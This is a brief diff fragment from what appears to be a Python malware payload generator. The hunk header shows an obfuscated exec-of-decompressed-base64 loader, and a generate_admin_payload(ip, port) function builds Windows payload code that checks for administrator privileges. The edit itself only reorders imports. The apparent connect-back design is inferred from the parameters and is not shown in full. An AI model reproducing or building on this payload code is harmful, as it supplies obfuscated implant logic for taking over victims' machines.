@@ -17,9 +17,9 @@ exec(zlib.decompress(base64.b64decode(d)),{{'s':s}})
         return payload
     
     def generate_admin_payload(ip, port):
-        payload = f"""import ctypes
-import sys
+        payload = f"""import ctypes, sys
 def is_admin():
+    import ctypes, sys
     try:
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except Exception:
